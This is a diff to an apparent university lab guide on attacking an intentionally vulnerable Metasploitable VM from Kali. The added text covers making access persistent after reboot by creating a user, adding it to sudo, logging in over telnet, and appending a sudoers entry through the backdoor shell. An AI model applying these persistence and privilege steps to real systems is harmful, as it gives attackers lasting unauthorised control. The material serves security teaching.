@@ -245,6 +245,10 @@ any commands you want.
 
 + Check that you are actually running commands on the remote machine (Metasploitable) and not locally by running the command  `hostname`
 
++ Try putting the Kali and Metasploitable windows side by side, run the “reboot” command.
+
+You will notice that when you rebooted Metasploitable, the backdoor shell stopped working. To gain access to the machine we would have to run the exploit again which might be problematic. We need therefore to make our access persistent.
+
 ## Making our access persistent
 
 As we saw in the Nmap scan, the victim is already running both SSH and Telnet, so the easiest way to gain persistent access is by adding an extra user to the system.
@@ -257,7 +261,7 @@ usermod -aG sudo ttm4175 % Add the user to the 'admin' group, this is equivalent
 reboot
 ```
 
-+ After running the reboot command, wait until Metasploitable has rebooted and then try to login with for example telnet: 
++ After running the reboot command, wait until Metasploitable has rebooted and then try to login with telnet: 
 ```bash
 apt-get install telnet
 telnet <IP_address_victim_machine>
@@ -271,3 +275,6 @@ $ sudo su % Switch to the root user
 ```
 
 The last command should print "root" if successful.
+
+:tip:
+If you get an error saying that "ttm4175 is not in the sudoers group", then you will have to manually add it. To do this, re-open the backdoor shell and type the following command: `echo "ttm4175 ALL=(ALL) ALL" >> /etc/sudoers`
